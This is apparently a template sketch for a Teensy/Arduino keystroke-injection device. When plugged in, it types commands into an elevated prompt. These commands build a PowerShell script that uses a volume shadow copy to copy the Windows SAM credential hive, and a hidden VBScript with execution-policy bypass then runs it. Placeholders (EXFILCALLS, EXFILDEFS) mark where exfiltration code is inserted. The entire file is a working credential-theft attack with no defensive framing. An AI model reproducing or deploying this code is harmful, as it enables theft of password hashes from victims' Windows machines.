#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  SAM file\" > %temp%\\vss.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\vss.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\vss.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\vss.ps1");
  Keyboard.println("echo $ser = (Get-Service -name VSS) >> %temp%\\vss.ps1");

    
  Keyboard.println("echo if($ser.Status -ne \"Running\"){ >> %temp%\\vss.ps1");
  Keyboard.println("echo $nr=1 >> %temp%\\vss.ps1");
  Keyboard.println("echo $ser.Start()} >> %temp%\\vss.ps1");
  Keyboard.println("echo $id = (gwmi -list win32_shadowcopy).Create(\"C:\\\",\"ClientAccessible\").ShadowID >> %temp%\\vss.ps1");
  Keyboard.println("echo $vol = (gwmi win32_shadowcopy -filter \"ID='$id'\") >> %temp%\\vss.ps1");
  Keyboard.println("echo `cmd /c copy \"$($vol.DeviceObject)\\windows\\system32\\config\\SAM\" $env:temp\\SAM` >> %temp%\\vss.ps1");
  Keyboard.println("echo $vol.Delete() >> %temp%\\vss.ps1");
  Keyboard.println("echo if($nr -eq 1) { $ser.Stop() } >> %temp%\\vss.ps1");
  Keyboard.println("echo $pv = Get-Content $env:temp\\SAM -Encoding UTF8 >> %temp%\\vss.ps1");
  delay(2000);

  String fn = "vss";
  String fp = "$env:temp\\SAM";
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\vss.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\vss.ps1\"),0,true >> %temp%\\vss.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\vss.vbs");
  delay(3000);

  Keyboard.println("exit");

}

void loop(){
}

DEFS
EXFILDEFS
